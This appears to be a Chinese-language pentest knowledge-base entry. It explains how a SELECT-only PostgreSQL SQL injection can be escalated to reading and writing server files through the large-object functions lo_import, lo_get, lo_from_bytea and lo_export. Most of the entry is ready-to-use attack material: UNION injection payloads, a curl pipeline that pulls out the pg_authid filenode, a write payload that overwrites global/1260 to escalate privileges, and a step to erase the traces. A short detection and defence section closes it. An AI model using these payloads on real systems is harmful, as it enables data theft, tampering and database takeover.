---
id: web-generic-sqli-postgresql-lo-import-file-read-write
title: PostgreSQL 注入仅允许 SELECT：用 lo_import/lo_get/lo_export 读写数据库服务器文件
type: scenario
domain: web
path: web/generic/sqli
technique: postgresql-large-object-file-read-write
aliases:
- PostgreSQL 大对象读文件
- lo_import 读取服务器文件
- lo_get 导出文件
- lo_from_bytea lo_export 写文件
- pgx 禁止堆叠查询
- SELECT-only SQL 注入
- 无效 SQL 注入升级文件读写
tags:
- sqli
- postgresql
- large-object
- lo-import
- lo-get
- lo-export
- file-read
- file-write
- pgx
- gin
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V75
  verified_at: '2026-11-05T16:36:02+08:00'
  notes: 已对照原文与图01-12核对；Gin+pgx v4预处理语句拒绝堆叠查询、lo_import/lo_get/lo_export/lo_from_bytea读写、base64外带均与截图一致；原文PostgreSQL 13.13为靶场环境版本而非受影响版本；PoC未复跑
---

## 一句话结论

当 SQL 注入被驱动限制为单条 SELECT（Gin + pgx 会把查询转成预处理语句，堆叠 `; UPDATE/DELETE` 被拒绝）时，仍可调用 PostgreSQL 服务端大对象函数：`lo_import(path)` 把服务器文件读入大对象，`lo_get(oid)` 取回内容并随 UNION 回显外带；反过来 `lo_from_bytea` + `lo_export` 可把任意内容写回服务器文件，从而把“无效注入”升级为以 `postgres` 用户身份的文件读写。

## 原理

- pgx v4 默认通过扩展查询协议把 SQL 转成预处理语句；PostgreSQL 不允许一个预处理语句包含多条命令，所以注入 `id=-1; SELECT pg_sleep(5);` 会返回 `ERROR: cannot insert multiple commands into a prepared statement (SQLSTATE 42601)`。`UPDATE`/`DELETE` 同理无法堆叠，只能停留在一条 SELECT 内。
- 但单条 SELECT 仍可调用有副作用的函数。PostgreSQL 服务端大对象接口：
  - `lo_import(path_to_file, lo_id)`：把服务器文件读入大对象，返回 OID；
  - `lo_get(oid)`：返回大对象内容（bytea）；
  - `lo_from_bytea(oid, bytea)`：由字节串创建/写入大对象；
  - `lo_export(oid, path_to_file)`：把大对象内容写到服务器文件。
  这些函数以 `postgres` 操作系统用户的权限访问文件系统，因此能读写该用户可访问的配置、数据目录和系统文件。
- 默认只有超级用户能执行这些函数，但管理员可能为了业务/运维把 `EXECUTE` 授予普通角色（`GRANT EXECUTE ON FUNCTION lo_import(text,oid) TO user;`）；官方文档也警告：授予服务端 `lo_import`/`lo_export` 的角色几乎等同于超级用户，因为可以读写服务器文件、改写配置。本文的 `poc_user` 正是这种“非超级用户但被授予大对象函数”的角色。
- 外带方式：注入点把查询结果按列回显，于是 `UNION SELECT 1337, CAST((SELECT lo_get(oid)) AS text)` 可直接把文件内容放进响应；二进制文件先用 `encode(lo_get(oid),'base64')`，本地 `base64 -d` 还原。大文件可用 `lo_get(oid, offset, length)`/`lo_substr` 分段读取。
- 写文件：本地把内容 base64 编码，注入 `lo_from_bytea(oid, decode('<base64>','base64'))` 创建大对象，再 `lo_export(oid, '/path')` 覆盖/写入。`lo_export` 会以 postgres 身份写入，因此可以改写 `postgresql.conf`、`pg_hba.conf`，甚至 `pg_authid` 的文件节点（`global/1260`）。
- 这也是后续两条链的基础：读配置/数据目录用于定位，写文件用于篡改 `pg_authid` 提权、写 `postgresql.conf` + 恶意 `.so` 做 RCE。

## 触发条件

- 存在可执行 `UNION SELECT`（或子查询）的 SQL 注入，且驱动/数据库禁止堆叠查询；单条 SELECT 足以调用函数。
- 当前数据库角色对 `lo_import`/`lo_get`/`lo_from_bytea`/`lo_export` 有 EXECUTE 权限（默认仅超级用户，需管理员显式授予或被角色继承）。
- 目标文件对 `postgres` 操作系统用户可读（读）或可写（写）；数据目录通常 0700 归 postgres。
- 注入点能把查询结果回显出来（本文 `phrases` 接口返回 JSON），否则需要盲注/带外通道。

## 利用步骤

1. 确认注入与堆叠限制：`id=-1; SELECT pg_sleep(5)` 报 `cannot insert multiple commands into a prepared statement`；`id=-1 OR (SELECT 1)=1` 正常返回，说明嵌套 SELECT 可用。
2. 检查函数权限（有权限时返回 t）：
   ```sql
   SELECT has_function_privilege(current_user, 'lo_import(text,oid)', 'EXECUTE');
   SELECT has_function_privilege(current_user, 'lo_get(oid)', 'EXECUTE');
   SELECT has_function_privilege(current_user, 'lo_export(oid,text)', 'EXECUTE');
   ```
3. 导入目标文件并读取：
   ```sql
   id=-1 UNION SELECT 1337, CAST((SELECT lo_import('/var/lib/postgresql/data/postgresql.conf', 31337)) AS text)
   id=-1 UNION SELECT 1337, CAST((SELECT lo_get(31337)) AS text)
   ```
   二进制文件用 base64：
   ```sql
   id=-1 UNION SELECT 1337, translate(encode(lo_get(31337),'base64'), E'\n', '')
   ```
   本地管道还原：`... | jq '.[].text' -r | base64 -d > file`。
4. 写入文件（先 `lo_from_bytea` 再 `lo_export`）：
   ```sql
   id=-1 UNION SELECT 1337, CAST((SELECT lo_from_bytea(3331337, decode('<base64>', 'base64'))) AS text)
   id=-1 UNION SELECT 1337, CAST((SELECT lo_export(3331337, '/path/to/target')) AS text)
   ```
   `lo_export` 返回 1 表示成功。
5. 清理：`SELECT lo_unlink(oid)` 删除大对象，减少痕迹。

## PoC

```sql
-- 1) 读服务器文件：postgresql.conf
id=-1 UNION SELECT 1337, CAST((SELECT lo_import('/var/lib/postgresql/data/postgresql.conf', 31337)) AS text)
-- 返回 {"id":1337,"text":"31337"}

id=-1 UNION SELECT 1337, CAST((SELECT lo_get(31337)) AS text)
-- 返回文件内容

-- 2) 二进制文件用 base64 外带
id=-1 UNION SELECT 1337, translate(encode(lo_get(31337),'base64'), E'\n', '')
```

```bash
# 下载并还原二进制文件节点
curl -G "http://target:8000/phrases" --data-urlencode \
  "id=-1 UNION SELECT 1337,translate(encode(lo_get(331337),'base64'), E'\n', '')" \
  | jq '.[].text' -r | base64 -d > pg_authid_filenode
```

```sql
-- 3) 写文件：base64 -> 大对象 -> lo_export
id=-1 UNION SELECT 1337, CAST((SELECT lo_from_bytea(3331337, decode('BASE64_DATA', 'base64'))) AS text)
id=-1 UNION SELECT 1337, CAST((SELECT lo_export(3331337, '/var/lib/postgresql/13/main/global/1260')) AS text)
```

说明：原文环境为 PostgreSQL 13.13（Ubuntu）、Gin + pgx v4，`poc_user` 被授予大对象函数；`lo_import`/`lo_get`/`lo_export` 均实际成功，PoC 未在本机复跑。

## 变体与关联

- **其他 PostgreSQL 文件函数**：`pg_read_file`/`pg_read_binary_file`/`pg_ls_dir`/`pg_stat_file` 通常仅超级用户；`COPY ... FROM PROGRAM`/`TO PROGRAM` 需要超级用户或 `pg_execute_server_program` 角色。
- **读取变体**：大文件用 `lo_get(oid, offset, length)` 或 `lo_substr` 分块；无回显时把 base64 内容拆成多行/多列带外。
- **写入变体**：`lo_put`/`lo_truncate` 修改已有大对象；`lo_export` 覆盖目标文件；也可写 `pg_hba.conf` 后 `pg_reload_conf` 放宽认证。
- **下游利用**：[[pentest-privilege-escalation-postgresql-pg-authid-filenode-superuser]]（改写 pg_authid 文件节点提权）、[[pentest-privilege-escalation-postgresql-shared-preload-libraries-rce]]（改配置 + 恶意 .so 做 RCE）。
- **边界**：函数未授权、`lo_export` 目标目录不可写、注入无回显且无带外通道、postgres 用户被 SELinux/AppArmor 限制文件访问时，本路径受限。

## 检测与防御

- **检测**：SQL 日志/审计中出现 `lo_import`、`lo_get`、`lo_export`、`lo_from_bytea`、`lo_unlink`；`pg_largeobject`/`pg_largeobject_metadata` 出现异常大对象。
- **检测**：数据库进程访问配置文件、数据目录、`/etc/passwd` 等非业务文件；postgres 用户对 Web 目录/系统文件的异常写入。
- **防御**：不要把 `lo_import`/`lo_export` 等大对象函数的 EXECUTE 授予普通业务角色；数据库账号最小权限；SQL 全部参数化，修复注入。
- **加固**：数据库与 Web 分离；数据目录 0700；SELinux/AppArmor 限制 postgres 文件访问；监控配置文件与数据目录完整性。
- **响应**：撤销异常授权、轮换数据库凭据、检查大对象与配置文件改动、回滚被篡改文件、审计后续提权/RCE 行为。
